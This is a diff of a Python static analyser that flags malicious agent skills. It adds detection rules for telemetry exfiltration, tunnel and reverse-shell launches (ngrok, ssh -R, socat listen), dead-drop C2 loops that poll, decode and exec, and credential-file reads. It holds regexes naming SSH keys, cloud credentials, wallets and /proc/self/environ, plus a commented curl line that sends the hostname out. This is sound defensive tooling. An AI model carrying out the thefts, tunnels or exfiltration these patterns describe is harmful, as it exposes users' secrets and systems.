@@ -154,6 +154,35 @@ _GIT_REMOTE_RE = re.compile(r"\bgit\s+remote\b", re.I)
 _HOST_INFO_SIGNAL_RE = re.compile(
     r"gethostname|platform\.(?:node|uname)|os\.uname|git|remote|hostname|whoami", re.I
 )
+
+# B-342 (T09/SkillTrustBench V_EXCESSIVE_TELEMETRY): EXCESSIVE_TELEMETRY_FLOW -- a
+# function that assembles a payload from >=2 distinct "over-collection" axes (bulk
+# environment-variable dump, recursive/bulk filesystem enumeration, bulk directory
+# listing, or a shell/command-history file read) whose value then reaches a network
+# sink. The bar is TWO distinct axes, not one -- a lone os.walk()/os.environ.items()/
+# os.listdir() call has too many ordinary uses on its own (indexing a project,
+# printing the current env for debugging, listing one directory the user pointed at)
+# to be a signal by itself; the requirement that a SINGLE function combine two or
+# more of these is what is actually rare in benign code and common in every corpus
+# sample this rule targets. Severity "info" -- WARN-first, same dual-use rationale as
+# ENV_EXFIL_FLOW/HOST_INFO_EXFIL_FLOW. The checks engine (checks/_vet.py) additionally
+# gates the finding on the skill's OWN SKILL.md NOT disclosing the collection (see
+# checks/_shared.py's _skill_declares_telemetry_disclosure) -- that disclosure check,
+# not this AST shape alone, is what actually distinguishes a hidden phone-home from a
+# disclosed, legitimate telemetry/diagnostics/backup skill.
+#
+# Taint here is name-based (not scope-precise) across the WHOLE file, same limitation
+# as the existing ENV_EXFIL_FLOW/HOST_INFO_EXFIL_FLOW/CRED_EXFIL_FLOW rules above --
+# a collector function's NAME is tracked so `data = collect_x(); send_x(data)` still
+# connects even though the invasive read and the network send live in different
+# functions (the two-function collect/send split every corpus sample uses).
+_HISTORY_FILENAME_RE = re.compile(
+    r"\.(?:bash|zsh|fish|ksh)_history\b|python_history\b", re.I
+)
+# Cheap prefilter so files with no telemetry-shaped signal at all skip the extra walks.
+_TELEMETRY_SIGNAL_RE = re.compile(
+    r"environ|\bwalk\b|rglob|listdir|iterdir|history|glob", re.I
+)
 # A shell command string containing a live host-identity substitution -- the concat-built
 # `'curl -s ' + URL + '/eval_chain -d h=$(hostname)'` shape that evades literal-curl
 # matching (no single contiguous "curl ... | sh"-style literal to match against).
@@ -266,6 +295,98 @@ def _curl_dropper_url_literal(node: ast.Call) -> str | None:
     return found
 
 
+# TUNNEL_LAUNCH_ARGV (B338 fix, checks/_content.py) -- the argv-list form of the same
+# tunnel/mesh-VPN launch primitives checks/_content.py's
+# `_B338_LAUNCH_RE` already names as TEXT (tailscale/tailscaled, cloudflared tunnel,
+# ngrok, ssh -R, a socat listener, frpc, bore, a bare --socks5-server flag). That regex
+# requires its subcommand words to be literally ADJACENT in the source text (e.g.
+# "tailscale up"); the idiomatic Python argv-list form the HuggingFace July-2026
+# incident's own compromised scripts/probe.py payload used --
+# `subprocess.run(["tailscale", "up", ...])` -- never produces that adjacency (there is
+# a `", "` between the two string literals, not whitespace), so the regex structurally
+# cannot match it. Mirrors `_is_curl_wget_argv_call`/DROPPER_DOWNLOAD_TO_TMP (C-205):
+# the sink is a subprocess.run/call/check_call/check_output/Popen call whose first
+# positional arg is a List/Tuple literal. Per-tool subcommand specificity mirrors
+# `_B338_LAUNCH_RE`'s own alternatives exactly, so a read-only invocation
+# (`["tailscale", "status"]`, `["ngrok", "--version"]`, `["cloudflared", "tunnel",
+# "list"]`/`["cloudflared", "tunnel", "login"]`) still does not match.
+_TUNNEL_ARGV_BARE_PROGRAMS = {"tailscaled", "frpc"}  # any invocation counts -- no subcommand
+_TUNNEL_ARGV_SUBCOMMANDS = {
+    "tailscale": {"up", "login"},
+    "ngrok": {"http", "tcp", "tls", "start"},
+    "bore": {"local"},
+}
+_CLOUDFLARED_TUNNEL_SUBCOMMANDS = {"--url", "run", "create"}
+# `\bssh\s+(?:-\w+\s+)*-R\s+\S*:\S+:\d+` -- the port-forward spec immediately after a
+# literal "-R" element, e.g. "8080:localhost:22".
+_SSH_R_SPEC_RE = re.compile(r"^\S*:\S+:\d+$")
+
+
+def _argv_str_elts(node: ast.List | ast.Tuple) -> list[str | None]:
+    """String value of each element of an argv List/Tuple literal, or None for a
+    non-string-constant element (a variable/f-string -- can't be resolved statically)."""
+    out: list[str | None] = []
+    for elt in node.elts:
+        if isinstance(elt, ast.Constant) and isinstance(elt.value, str):
+            out.append(elt.value)
+        else:
+            out.append(None)
+    return out
+
+
+def _is_tunnel_launch_argv_call(node: ast.AST) -> bool:
+    """subprocess.run/call/check_call/check_output/Popen(['tailscale', 'up', ...] | ...)
+    -- see the module comment above `_TUNNEL_ARGV_BARE_PROGRAMS` for the HF-incident
+    motivation and why the text-regex form misses this shape entirely."""
+    if not isinstance(node, ast.Call):
+        return False
+    f = node.func
+    if not (
+        isinstance(f, ast.Attribute)
+        and f.attr in _EXEC_SINK_SUBP_ATTRS
+        and _attr_base(f.value) in _EXEC_SINK_BASES_SUBP
+    ):
+        return False
+    if not node.args or not isinstance(node.args[0], (ast.List, ast.Tuple)):
+        return False
+    elts = _argv_str_elts(node.args[0])
+    if not elts:
+        return False
+
+    # --socks5-server is a standalone flag `_B338_LAUNCH_RE` matches regardless of the
+    # invoking program (the bad fixture's `tailscaled --tun=... --socks5-server=...`
+    # userspace-networking mode) -- check every element, not just the program name.
+    if any(e is not None and e.lower().startswith("--socks5-server") for e in elts):
+        return True
+
+    prog = elts[0].lower() if elts[0] is not None else None
+    if prog is None:
+        return False
+    if prog in _TUNNEL_ARGV_BARE_PROGRAMS:
+        return True
+    if prog == "cloudflared":
+        for i in range(1, len(elts) - 1):
+            e = elts[i]
+            if e is not None and e.lower() == "tunnel":
+                nxt = elts[i + 1]
+                if nxt is not None and nxt.lower() in _CLOUDFLARED_TUNNEL_SUBCOMMANDS:
+                    return True
+        return False
+    if prog == "ssh":
+        for i, e in enumerate(elts):
+            if e == "-R" and i + 1 < len(elts):
+                nxt = elts[i + 1]
+                if nxt is not None and _SSH_R_SPEC_RE.match(nxt):
+                    return True
+        return False
+    if prog == "socat":
+        return len(elts) > 1 and elts[1] is not None and "listen" in elts[1].lower()
+    subs = _TUNNEL_ARGV_SUBCOMMANDS.get(prog)
+    if subs is not None:
+        return any(e is not None and e.lower() in subs for e in elts[1:])
+    return False
+
+
 # C-224: curated first-party installer allowlist for DROPPER_DOWNLOAD_TO_TMP's
 # literal-URL sub-case. DUPLICATED from checks/_content.py's B-118
 # _CLICKFIX_TRUSTED_INSTALLERS (not imported: skillast.py is a Layer-1 leaf and
@@ -319,11 +440,50 @@ def _is_trusted_installer_url(url: str) -> bool:
 _CRED_PATH_RE = re.compile(
     r"\.ssh/id_|\bid_rsa\b|\bid_ed25519\b|\.aws/credentials|login\.keychain|wallet\.dat|"
     r"keystore\.json|\.npmrc|\.pypirc|\.netrc|\.docker/config|\.kube/config|"
-    r"\.config/gcloud|/\.?secrets?\b|cookies\.sqlite|Cookies\b",
+    r"\.config/gcloud|/\.?secrets?\b|cookies\.sqlite|Cookies\b|"
+    # E-065/C-323: the HF-incident reproduction read a process's own environment
+    # (which commonly carries API keys/tokens passed via env var) through procfs
+    # rather than a dotfile. /var/run/secrets and /run/secrets (K8s service-account
+    # token, Docker/Swarm secrets mounts) are already covered above by /\.?secrets?\b.
+    r"/proc/(?:self|\d+)/environ",
     re.I,
 )
-_NET_SINK_ATTRS_ANY = {"post", "put", "patch", "urlopen", "request"}
-_NET_SINK_ATTRS_BASED = {"send", "sendall", "sendto", "connect"}
+
+# B-415: an in-cluster K8s/container identity token -- the standard mount at
+# /var/run/secrets/kubernetes.io/serviceaccount/token -- read and presented as a
+# Bearer credential to the cluster's OWN API server is the textbook, correct way
+# for a pod-resident tool to authenticate in-cluster (kubernetes.client's own
+# incluster_config, and virtually every K8s operator/controller, do exactly
+# this). It is not credential theft. Narrower than _CRED_PATH_RE on purpose:
+# ONLY this fully-qualified service-account token path counts as an "in-cluster
+# identity token" for the CRED_EXFIL_FLOW exemption below -- .ssh/.aws/generic
+# secrets-mount reads never qualify, at any position or destination.
+_INCLUSTER_TOKEN_PATH_RE = re.compile(
+    r"/(?:var/)?run/secrets/kubernetes\.io/serviceaccount/token\b", re.I
+)
+# The cluster's own in-cluster API server -- the ONLY destination the exemption
+# below recognizes. A destination this can't positively resolve to this pattern
+# (an attacker-controlled host, or an expression it can't statically resolve at
+# all) fails CLOSED: the finding stays crit exactly as before.
+_INCLUSTER_API_HOST_RE = re.compile(
+    r"kubernetes\.default(?:\.svc(?:\.cluster\.local)?)?\b|\.svc\.cluster\.local\b|"
+    r"KUBERNETES_SERVICE_HOST",
+    re.I,
+)
+# B-422 (C-348 adversarial review): "put"/"patch"/"request" are common
+# method names with nothing to do with networking on an arbitrary object --
+# queue.Queue.put / multiprocessing.Queue.put, unittest.mock.patch, and any bare
+# `.request()` handler all matched here on ANY attribute base, so e.g. a local
+# producer/consumer pattern that assembled two collection axes and called
+# `work.put(...)` on a plain queue.Queue read as "flows into a network sink"
+# (a false EXCESSIVE_TELEMETRY_FLOW/etc. -- _is_net_sink is shared by every rule
+# below that looks for an outbound sink). Moved into _NET_SINK_ATTRS_BASED so they
+# only count when the call's base object resolves to a known networking module or a
+# `session` variable (_NET_SINK_BASES) -- mirrors how send/sendall/sendto/connect
+# were already gated. "post"/"urlopen" stay ungated: no comparably common
+# non-network false-positive shape for those two turned up during the same review.
+_NET_SINK_ATTRS_ANY = {"post", "urlopen"}
+_NET_SINK_ATTRS_BASED = {"send", "sendall", "sendto", "connect", "put", "patch", "request"}
 _NET_SINK_BASES = {
     "requests",
     "httpx",
@@ -459,37 +619,184 @@ def _value_is_tainted_source(node: ast.AST, tainted: set[str]) -> bool:
     return False
 
 
-def _external_tainted_names(tree: ast.AST, func_params: set[str]) -> set[str]:
-    """Compute tainted names for TT4/TT5/SSRF rules.
+def _external_tainted_names(
+    tree: ast.AST,
+    func_param_taint: dict,
+    owner_map: dict,
+    parent_scope: dict,
+    shadow_cache: dict,
+) -> dict:
+    """Compute SCOPE-BUCKETED tainted names for TT4/TT5/SSRF rules (B-413, layer 1).
 
-    Sources: function parameters, os.getenv/os.environ[...], open/read (file),
-    requests.get/urllib.urlopen/httpx.get (network input), input(), tool-result calls.
-    Propagation: assignment, dict/list packing, f-strings, fixpoint up to 6 iterations.
+    Returns a dict keyed by owning scope node (a function at any nesting depth, a
+    top-level class's own method, or None for module-level / global-declared /
+    owner-map-unreachable assignments) -- mirrors `_tainted_names`'s scope-bucketing
+    model, fixing the SAME class of false positive for THIS rule's own taint source.
+    The old flat `set[str]` seed (every function's params, no scope) let a parameter
+    in one function taint an unrelated same-named local in a totally different
+    function, or let a generic name reused across sibling functions collide -- see
+    `_func_param_taint_by_scope`'s docstring for the concrete case_00374/case_01948
+    shapes. `func_param_taint` fixes the SOURCE half by seeding each function's OWN
+    params into its OWN bucket instead of one flat whole-file set; this function fixes
+    the PROPAGATION half by testing sourced-ness, and bucketing a newly-tainted
+    target, against the taint actually VISIBLE at each assignment's own lexical
+    position (`_tainted_names_visible`) instead of a flat whole-file set.
+
+    Sources: function parameters (scope-bucketed, see above), os.getenv/
+    os.environ[...], open/read (file), requests.get/urllib.urlopen/httpx.get (network
+    input), input(), tool-result calls -- the same four `sourced` predicates as
+    before, kept VERBATIM (they are the rule's semantics, not what B-413 fixes).
+    Propagation: assignment (Assign AND AugAssign) and tuple/list-unpacking targets,
+    fixpoint up to 6 iterations. global/nonlocal bucket redirection mirrors
+    `_tainted_names`'s own fixpoint (the same mature, C-135-hardened scope/binding
+    model already used for the decode->exec taint rule -- near-mechanical
+    transposition here, not a new design).
+
+    B-414: two more propagation shapes join the same fixpoint, using the SAME four
+    `sourced` predicates applied to a different expression, and the SAME global/
+    nonlocal-redirect bucketing (factored out into `_bucket_new_taint` below so it is
+    not triplicated):
+
+      * a comprehension's `for target in iterable` taints `target`, scope-bucketed to
+        the comprehension's OWN scope (`_build_toplevel_owner_map`'s B-414 addition --
+        `owner_map.get(<the ast.comprehension clause>)` resolves to the enclosing
+        ListComp/SetComp/DictComp/GeneratorExp node), when `iterable` is itself
+        sourced/tainted -- this is what closes the silent TT5 miss on
+        `[subprocess.run(c, shell=True) for c in cmds]` where `cmds` is tainted.
+      * a walrus (`x := ...`) target is sourced exactly like an assignment's RHS, but
+        BUBBLED past every enclosing comprehension-type scope before bucketing -- per
+        PEP 572, it binds in the scope CONTAINING the comprehension (the outermost one,
+        for a nested comprehension), never the comprehension itself, matching
+        `_own_bound_names`'s deliberate choice not to treat a walrus target as a
+        comprehension's own bound name either.
     """
-    tainted: set[str] = set(func_params)
+    tainted: dict = {}
+    for scope, names in func_param_taint.items():
+        tainted.setdefault(scope, set()).update(names)
+
     assigns = [n for n in ast.walk(tree) if isinstance(n, (ast.Assign, ast.AugAssign))]
+    comprehensions = [n for n in ast.walk(tree) if isinstance(n, ast.comprehension)]
+    namedexprs = [
+        n
+        for n in ast.walk(tree)
+        if isinstance(n, ast.NamedExpr) and isinstance(n.target, ast.Name)
+    ]
+    global_cache: dict = {}
+    nonlocal_cache: dict = {}
+
+    def _global_nonlocal_for(scope) -> tuple[set[str], set[str]]:
+        if scope is None:
+            return set(), set()
+        if scope not in global_cache:
+            global_cache[scope] = _global_declared_names(scope, owner_map)
+        if scope not in nonlocal_cache:
+            nonlocal_cache[scope] = _nonlocal_declared_names(scope, owner_map)
+        return global_cache[scope], nonlocal_cache[scope]
+
+    def _bucket_new_taint(name: str, scope, global_names: set[str], nonlocal_names: set[str]) -> bool:
+        """Add `name` to `tainted`, redirected to its REAL bucket exactly like the
+        Assign path always has (B-205/B-215): a `global`-declared name always goes to
+        the module (None) bucket; a `nonlocal`-declared name resolves to whichever
+        ancestor(s) Python would really rebind (`_nonlocal_target_scopes`), falling
+        back to the pre-B-215 seed-every-ancestor over-approximation when unresolvable;
+        anything else buckets to `scope` itself. Returns whether anything changed."""
+        if name in global_names:
+            bucket_keys = [None]
+        elif name in nonlocal_names:
+            resolved = _nonlocal_target_scopes(
+                name, scope, parent_scope, owner_map, shadow_cache, nonlocal_cache
+            )
+            if not resolved:
+                # Unresolvable binding form -- fall back to the pre-B-215
+                # over-approximation (see `_nonlocal_target_scopes`).
+                resolved = []
+                ancestor = parent_scope.get(scope)
+                while ancestor is not None:
+                    resolved.append(ancestor)
+                    ancestor = parent_scope.get(ancestor)
+            bucket_keys = resolved
+        else:
+            bucket_keys = [scope]
+        changed_here = False
+        for key in bucket_keys:
+            bucket = tainted.setdefault(key, set())
+            if name not in bucket:
+                bucket.add(name)
+                changed_here = True
+        return changed_here
 
     for _ in range(6):
         changed = False
         for a in assigns:
             rhs = a.value
             targets = a.targets if isinstance(a, ast.Assign) else [a.target]
+            visible = _tainted_names_visible(a, tainted, owner_map, parent_scope, shadow_cache)
             sourced = (
-                _value_is_tainted_source(rhs, tainted)
+                _value_is_tainted_source(rhs, visible)
                 or _rhs_has_subscript_environ(rhs)
-                or _rhs_has_fstring_taint(rhs, tainted)
-                or bool(_names_in(rhs) & tainted)
+                or _rhs_has_fstring_taint(rhs, visible)
+                or bool(_names_in(rhs) & visible)
             )
-            if sourced:
-                for t in targets:
-                    if isinstance(t, ast.Name) and t.id not in tainted:
-                        tainted.add(t.id)
-                        changed = True
-                    elif isinstance(t, (ast.Tuple, ast.List)):
-                        for elt in t.elts:
-                            if isinstance(elt, ast.Name) and elt.id not in tainted:
-                                tainted.add(elt.id)
-                                changed = True
+            if not sourced:
+                continue
+
+            scope = owner_map.get(a)
+            global_names, nonlocal_names = _global_nonlocal_for(scope)
+
+            names_to_add: list = []
+            for t in targets:
+                if isinstance(t, ast.Name):
+                    names_to_add.append(t.id)
+                elif isinstance(t, (ast.Tuple, ast.List)):
+                    names_to_add.extend(elt.id for elt in t.elts if isinstance(elt, ast.Name))
+
+            for name in names_to_add:
+                if _bucket_new_taint(name, scope, global_names, nonlocal_names):
+                    changed = True
+
+        for gen in comprehensions:
+            iterable = gen.iter
+            # B-414 (C-135, self-caught): visibility is resolved from `iterable`'s OWN
+            # owner-map position, NOT `gen`'s (the `ast.comprehension` clause always
+            # owner-maps to the comprehension itself) -- `_build_toplevel_owner_map`'s
+            # `_map_comprehension_scope` maps the FIRST generator's `iter` to the
+            # ENCLOSING scope (real Python: it is evaluated there, before the
+            # comprehension's own `for`-target exists), so using `gen` here would
+            # wrongly let that target's own name shadow an outer occurrence of the
+            # SAME bare name in its own iterable (`for cmds in cmds`).
+            visible = _tainted_names_visible(iterable, tainted, owner_map, parent_scope, shadow_cache)
+            sourced = (
+                _value_is_tainted_source(iterable, visible)
+                or _rhs_has_subscript_environ(iterable)
+                or _rhs_has_fstring_taint(iterable, visible)
+                or bool(_names_in(iterable) & visible)
+            )
+            if not sourced:
+                continue
+            scope = owner_map.get(gen)
+            global_names, nonlocal_names = _global_nonlocal_for(scope)
+            for name in _assign_target_names(gen.target):
+                if _bucket_new_taint(name, scope, global_names, nonlocal_names):
+                    changed = True
+
+        for ne in namedexprs:
+            rhs = ne.value
+            visible = _tainted_names_visible(ne, tainted, owner_map, parent_scope, shadow_cache)
+            sourced = (
+                _value_is_tainted_source(rhs, visible)
+                or _rhs_has_subscript_environ(rhs)
+                or _rhs_has_fstring_taint(rhs, visible)
+                or bool(_names_in(rhs) & visible)
+            )
+            if not sourced:
+                continue
+            scope = owner_map.get(ne)
+            while isinstance(scope, _COMPREHENSION_SCOPE_NODES):
+                scope = parent_scope.get(scope)
+            global_names, nonlocal_names = _global_nonlocal_for(scope)
+            if _bucket_new_taint(ne.target.id, scope, global_names, nonlocal_names):
+                changed = True
+
         if not changed:
             break
     return tainted
@@ -517,8 +824,10 @@ def _external_tainted_names(tree: ast.AST, func_params: set[str]) -> set[str]:
 #
 # Deliberately NARROW, to keep this crit rule sound:
 #   * only NETWORK reads are sources — not file reads, not env, and above all not
-#     function parameters (every param is `ext_tainted`, so admitting params would make
-#     almost any helper "remote-returning" and mass-false-fire this crit rule);
+#     function parameters (every param is externally tainted for TT5/SSRF's own
+#     purposes — see `_func_param_taint_by_scope`/`_external_tainted_names` — so
+#     admitting params here too would make almost any helper "remote-returning" and
+#     mass-false-fire this crit rule);
 #   * only ONE hop of return-value propagation (a locally-defined function whose own
 #     return value is network-derived), not a general interprocedural analysis;
 #   * the sink set is exec/eval only — the shell/subprocess sinks stay with TT5, whose
@@ -791,18 +1100,383 @@ def _remote_fetch_tainted_names(tree: ast.AST) -> set[str]:
     return tainted
 
 
-def _collect_func_params(tree: ast.AST) -> set[str]:
-    """All argument names of all function definitions in *tree*."""
-    params: set[str] = set()
+# F-159 (TA488/OWAReaper — Proofpoint/NSA, CVE-2026-42897): the dead-drop C2 resolver
+# shape — a periodic poll of a remote content/search API, whose response is decoded,
+# and the decoded value reaches an exec sink. Each leg alone is common and benign (a
+# periodic version-check poll; a decode call reading an embedded asset; an exec sink in
+# a CLI wrapper); all three chained is a resolver. Reuses this module's EXISTING
+# decode->exec vocabulary end to end — `_is_decode_primitive_call` (the same
+# base64/hex/b85/zlib primitive family OBFUSCATED_EXEC/CHUNKED_FILE_EXEC already use),
+# `_is_exec_sink_call` (the same eval/exec/os.system/subprocess sink set TT5 uses), and
+# `_expr_reads_remote`/`_names_in` (the same network-source vocabulary REMOTE_CODE_LOAD
+# uses) — no new decode/sink taxonomy is introduced here, only the periodicity leg and
+# the taint sweep that connects the three.
+#
+# Deliberately does NOT gate on the polled host (api.github.com, a gist endpoint, a
+# search API, ...): per the task's own finding, the host is legitimate BY DESIGN — that
+# is the entire point of a dead drop. A host denylist here would be the exact C-303
+# cautionary shape (a signal that scores perfectly on a corpus and is unsound on real
+# skills, because every legitimate skill that touches the SAME host would also match).
+_SLEEP_BASES = {"time", "asyncio", "trio", "eventlet"}
+
+
+def _is_sleep_call(node: ast.AST) -> bool:
+    """`time.sleep(...)` / `asyncio.sleep(...)` / a bare `sleep(...)` (from `time import
+    sleep`) — the periodicity primitive a polling loop uses to wait between rounds."""
+    if not isinstance(node, ast.Call):
+        return False
+    f = node.func
+    if isinstance(f, ast.Name) and f.id == "sleep":
+        return True
+    return isinstance(f, ast.Attribute) and f.attr == "sleep" and _attr_base(f.value) in _SLEEP_BASES
+
+
+def _fetching_funcnames(tree: ast.AST) -> set[str]:
+    """Names of locally-defined functions whose OWN body performs a network fetch
+    (`_is_remote_fetch_call`) anywhere in it — one hop, mirroring this module's other
+    remote-fetch helpers (`_remote_returning_funcs`), used so a poll LOOP that calls a
+    small `_poll_once()`-style helper (rather than fetching inline) still counts."""
+    names: set[str] = set()
+    for fn in ast.walk(tree):
+        if not isinstance(fn, (ast.FunctionDef, ast.AsyncFunctionDef)):
+            continue
+        if any(_is_remote_fetch_call(n) for n in ast.walk(fn)):
+            names.add(fn.name)
+    return names
+
+
+def _poll_loop_present(tree: ast.AST, fetching_funcs: set[str]) -> bool:
+    """True when a `while`/`for` loop's own subtree carries BOTH a sleep-like call and a
+    network fetch — inline, or one hop through a name in *fetching_funcs* — the
+    `while True: _poll_once(); time.sleep(N)` scheduler shape (leg 1 of the dead-drop
+    resolver composition). Deliberately narrow: a cron-like interval config/decorator or
+    an "every N minutes" prose directive is NOT recognised here — this narrows rather
+    than closes the periodicity signal; widening either needs its own fixture + C-135
+    pass, not folding in here unreviewed."""
     for node in ast.walk(tree):
-        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
-            for arg in node.args.args + node.args.posonlyargs + node.args.kwonlyargs:
-                params.add(arg.arg)
-            if node.args.vararg:
-                params.add(node.args.vararg.arg)
-            if node.args.kwarg:
-                params.add(node.args.kwarg.arg)
-    return params
+        if not isinstance(node, (ast.While, ast.For)):
+            continue
+        has_sleep = False
+        has_fetch = False
+        for sub in ast.walk(node):
+            if _is_sleep_call(sub):
+                has_sleep = True
+                continue
+            if isinstance(sub, ast.Call):
+                if _is_remote_fetch_call(sub):
+                    has_fetch = True
+                elif isinstance(sub.func, ast.Name) and sub.func.id in fetching_funcs:
+                    has_fetch = True
+            if has_sleep and has_fetch:
+                return True
+    return False
+
+
+def _deaddrop_fetch_tainted_names(scope: ast.AST) -> set[str]:
+    """F-159: names holding network-fetched data WITHIN *scope*'s own body, propagated
+    through simple assignment AND a plain `for` target over a fetch-tainted iterable —
+    unlike `_remote_fetch_tainted_names` (Assign only), which misses the dead-drop
+    shape's `for line in body.splitlines():` idiom.
+
+    *scope* MUST be one node from `_deaddrop_resolver_findings`'s own scope list (an
+    `ast.Module`, or a single `ast.FunctionDef`/`ast.AsyncFunctionDef`), walked via
+    `_scope_own_nodes` — which stops at nested function/class/lambda boundaries. C-135
+    (adversarial self-review, same pass this check's own DoD requires): an EARLIER cut
+    walked the WHOLE tree in one flat pass, so a bare name reused across two unrelated
+    SIBLING functions (e.g. `data` fetched in a poller, and an unrelated `data` literal
+    in a totally different installer function) let the second bleed the first's taint —
+    a confirmed false FAIL. Scoping per function (mirroring `_scope_own_nodes`'s own
+    stated purpose: "a local name reused across sibling functions is resolved
+    per-scope, not conflated") closes that without weakening detection: the bad
+    fixture's poll/decode/exec all live in ONE function, so a per-scope sweep still
+    sees them together; only the periodicity leg (`_poll_loop_present`,
+    `_fetching_funcnames`) is intentionally structural/cross-function, one hop, exactly
+    like this module's other B-284 remote-fetch helpers."""
+    tainted: set[str] = set()
+    assigns = [n for n in _scope_own_nodes(scope) if isinstance(n, ast.Assign)]
+    for_loops = [n for n in _scope_own_nodes(scope) if isinstance(n, ast.For)]
+    for _ in range(6):
+        changed = False
+        for a in assigns:
+            if not (_expr_reads_remote(a.value) or (_names_in(a.value) & tainted)):
+                continue
+            for t in a.targets:
+                for name in _assign_target_names(t):
+                    if name not in tainted:
+                        tainted.add(name)
+                        changed = True
+        for f in for_loops:
+            if not (_expr_reads_remote(f.iter) or (_names_in(f.iter) & tainted)):
+                continue
+            for name in _assign_target_names(f.target):
+                if name not in tainted:
+                    tainted.add(name)
+                    changed = True
+        if not changed:
+            break
+    return tainted
+
+
+def _deaddrop_decode_tainted_names(scope: ast.AST, fetch_tainted: set[str]) -> set[str]:
+    """F-159: names holding the DECODED form of *fetch_tainted* data, WITHIN *scope*'s
+    own body (see `_deaddrop_fetch_tainted_names`'s docstring for the scoping
+    discipline and why it matters) — an assignment whose RHS is a real decode primitive
+    (`_is_decode_primitive_call`, the same base64/hex/b85/zlib family OBFUSCATED_EXEC
+    already trusts) applied to a fetch-tainted argument, propagated onward through
+    further plain assignment."""
+    if not fetch_tainted:
+        return set()
+    tainted: set[str] = set()
+    assigns = [n for n in _scope_own_nodes(scope) if isinstance(n, ast.Assign)]
+    for _ in range(6):
+        changed = False
+        for a in assigns:
+            rhs = a.value
+            is_decode_of_fetched = (
+                _is_decode_primitive_call(rhs)
+                and bool(rhs.args)
+                and bool(_names_in(rhs.args[0]) & fetch_tainted or _expr_reads_remote(rhs.args[0]))
+            )
+            if not (is_decode_of_fetched or (_names_in(rhs) & tainted)):
+                continue
+            for t in a.targets:
+                for name in _assign_target_names(t):
+                    if name not in tainted:
+                        tainted.add(name)
+                        changed = True
+        if not changed:
+            break
+    return tainted
+
+
+def _deaddrop_subprocess_command_parts(
+    node: ast.Call, list_bindings: dict[str, ast.List | ast.Tuple] | None
+) -> list[ast.AST] | None:
+    """F-159 follow-up (adversarial review on B347, subprocess data-argument false
+    FAIL): for a subprocess.* exec-sink Call *node*, return the list of the call's own
+    argument sub-expressions that constitute COMMAND position — the thing execve (or
+    a shell, or a re-invoked interpreter) actually runs — or None when the WHOLE call
+    is command position (shell=True/an unprovable dynamic shell= value, or the command
+    is not a resolvable fixed argv list — a string/joined/concatenated/unresolved-name
+    form, where there is no safe "data argument" position to carve out at all).
+
+    When a list is returned, it is EXACTLY argv[0] (the fixed program element) unless
+    argv[0] itself names a shell/indirect-execution interpreter
+    (`_argv0_is_shell_indirect_exec`), in which case every element counts, since that
+    interpreter re-parses the rest of the argv list as its own command text — the
+    identical classification `_subprocess_taint_is_command_injection` already applies
+    for TT5/TT5_ARG_INJECTION, reused here (not re-derived) so the two checks can
+    never quietly disagree about what "command position" means for the same call
+    shape.
+
+    Only subprocess.* has this distinction at all: os.system()/os.popen() run their
+    sole string argument through a shell (whatever is IN the string is executed —
+    there is no separate inert-data position), and bare eval()/exec() run their sole
+    argument itself AS code. Callers only invoke this for a `sink_name` that starts
+    with `"subprocess."`; see `_deaddrop_resolver_findings`.
+    """
+    for kw in node.keywords:
+        if kw.arg == "shell":
+            v = kw.value
+            if not (isinstance(v, ast.Constant) and v.value is False):
+                return None  # shell=True, or an unprovable dynamic value
+    first = node.args[0] if node.args else None
+    if isinstance(first, ast.Name) and list_bindings:
+        first = list_bindings.get(first.id, first)
+    if not isinstance(first, (ast.List, ast.Tuple)) or not first.elts:
+        return None  # string / joined-str / concatenated / unresolved / empty command
+    elts = first.elts
+    if _argv0_is_shell_indirect_exec(elts):
+        return list(elts)  # the interpreter re-parses ALL of them as command text
+    return [elts[0]]
+
+
+def _deaddrop_resolver_findings(
+    tree: ast.AST,
+    list_bindings_by_call: dict[ast.Call, dict[str, ast.List | ast.Tuple]] | None = None,
+) -> tuple[list[tuple[int, str]], list[tuple[int, str]]]:
+    """F-159: the dead-drop C2 resolver composition — see the module comment above
+    `_SLEEP_BASES`. Returns (confirmed, ambiguous), each a list of (lineno, reason):
+
+      confirmed — WITHIN ONE SCOPE (a function, or module top-level), the decoded
+                  value (or an inline decode of fetch-tainted content) is a
+                  demonstrable ARGUMENT of an exec-sink call, AND — for a
+                  subprocess.* sink specifically — that argument lands in COMMAND
+                  position, not merely a trailing DATA position of a fixed,
+                  non-interpreter program (`_deaddrop_subprocess_command_parts`) —
+                  FAIL-grade (taint confirmed AND the decoded value is the thing
+                  actually executed, not merely inert execve data). Taint is
+                  deliberately scoped per function (`_deaddrop_fetch_tainted_names`'s
+                  docstring) so an unrelated sibling function's same-named local can
+                  never be mistaken for fetched/decoded data.
+      ambiguous — a poll loop, a decode primitive, AND an exec sink are all present
+                  SOMEWHERE in the file (this leg is intentionally file-wide, not
+                  per-scope — it names an ambiguous co-occurrence for human review, not
+                  a proven chain), but no scope's dataflow confirms the decoded value
+                  is EXECUTED by the sink — either no connection is confirmed at all,
+                  or (adversarial-review follow-up) the only confirmed connection is
+                  the decoded value reaching a subprocess.* sink as a non-program data
+                  argument to a FIXED, trusted local binary — e.g.
+                  `subprocess.run(["logger", "-t", "x", corr_id])` logging a decoded
+                  correlation id, or `subprocess.run(["sha256sum", "--check",
+                  checksum])` verifying a downloaded artifact's integrity with a
+                  decoded checksum. Both are common, legitimate patterns (the
+                  checksum case is a security-POSITIVE integrity check) — WARN-grade,
+                  same "argument injection, not command injection" distinction
+                  TT5_ARG_INJECTION already draws for the general case, deliberately
+                  reused rather than re-derived (see
+                  `_subprocess_taint_is_command_injection`'s docstring).
+
+    Neither list is populated unless the poll-loop gate (`_poll_loop_present`) holds —
+    a one-shot fetch->decode->exec with no periodicity is not this rule's concern; the
+    direct one-shot case is already covered elsewhere in this module (TT5_CMD_INJECTION,
+    REMOTE_CODE_LOAD).
+
+    *list_bindings_by_call* (optional, default None — an empty per-call binding map is
+    used when omitted) is `_list_bindings_by_call(tree)`'s result, reused verbatim from
+    the caller (never recomputed here) so a subprocess command bound to a local
+    variable (`cmd = ["logger", "-t", "x"]; ...; subprocess.run(cmd + [corr_id])` —
+    well, more precisely the common `cmd = [...]; subprocess.run(cmd)` single-binding
+    idiom `_single_list_bindings_local` resolves) is still recognised as a fixed argv
+    list, not treated as an unresolved dynamic command.
+    """
+    fetching_funcs = _fetching_funcnames(tree)
+    if not _poll_loop_present(tree, fetching_funcs):
+        return [], []
+    if not any(_is_decode_primitive_call(n) for n in ast.walk(tree)):
+        return [], []
+
+    bindings_by_call = list_bindings_by_call or {}
+    scopes: list[ast.AST] = [tree]
